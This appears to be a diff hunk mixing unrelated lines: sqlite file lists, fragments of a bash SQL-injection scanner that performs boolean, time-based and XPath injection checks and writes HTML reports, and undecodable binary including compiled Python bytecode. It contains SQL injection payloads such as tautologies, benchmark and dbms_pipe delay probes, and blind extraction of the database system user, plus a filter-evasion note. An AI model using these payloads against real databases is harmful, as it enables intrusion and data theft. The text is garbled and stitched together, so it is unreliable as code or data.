@@ -348,56 +348,6 @@ J) # Filter Evasion nesting 'select' => 'selselectect'
 4,run-430.sqlite
 4,run-921.sqlite
 1,oqmd-1514.sqlite3
-4,run-837.sqlite
-while [[ $bicount -le $length ]] ; do
-#echo "postdataparams $postdataparams"
-4,run-770.sqlite
-D)  #back end dbms
-output='';
-# if this fails, continue to re-run the full lettergrab() as normal...
-4,run-105.sqlite
-4,2823318777ntouromlalnodry--naod.sqlite
-echo -n "<Input type="text" size=80 name=\"$paramname\" value=\"$decparam\"> " >> ./output/$safelogname-report-$safefilename.html
-' or 1 --'
-if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
-4,run-169.sqlite
-#initialise some variables:
-echo "<H4>XPath Injection Data</H4>" >> ./output/$safelogname-report-$safefilename.html
-if [ true = "$Z" ] ; then echo "DEBUG! true $request" ;fi
-self.log.debug("DB lock acquired")
-) or benchmark(10000000,MD5(1))#"
-4,run-637.sqlite
-in****:"ADODB.Command"
-6,5.2.5-6.0.0.sqlite
-firstchar="${payload:1:1}"
-"^"
-stringlength=${#uriinputencode}
-a" or "dfth"="dfth"-- #
-4,run-197.sqlite
-output=''
-")) or benchmark(10000000,MD5(1))#
-4,run-905.sqlite
-\' and 1337=dbms_pipe.receive_message(1,120) --
-echo "[$remessage REQ:$K] $method URL: $uhostname$page"?"$badparams" >> ./output/$safelogname$safefilename.txt
-operation="ADD"
-119) output="w" ;;
-4,run-596.sqlite
-A?{??b?)????"????2ܼ??%?????&?
-length_false=`echo $response | cut -d ":" -f 2`
-echo -n " "
-4,run-818.sqlite
-# presence of this file whenever a scan is launched
-4,run-136.sqlite
-#get="GET "
-B?4A=?=Bc                 ?   ? 	 | ?                     |?  ?         d S #  | j        ?                    d?  ?         Y d S xY w)Nz;Could not open SQLite database file. Is the file corrupted?)r   r   r   )r   r   s     r   ?openDBzDatabase.openDB)   sJ   ? ?	Z??*?*?:?6?6?6?6?6??	Z??H?N?N?X?Y?Y?Y?Y?Y?Y???s   ? ?8?
-if [[ "$xpathCheck" != "" ]] ; then
-4,run-164.sqlite
-a" and "fghi"="fghj"-- #
-echo "Trying status/length-based data extraction"
-root") or ("1"="1
-1,flasky-sqlalchemy-dev-sqlite3.sqlite
-4,run-767.sqlite
-((timediff=$time_true-$time_false))
 1,test-rel.sqlite3
 tput sgr0 # Reset attributes.
 badparams=`echo "$cleanoutput" | replace "$payload" "1/(case when (ascii(substring((select system_user),1,1)) > 0) then 1 else 0 end)$end"`
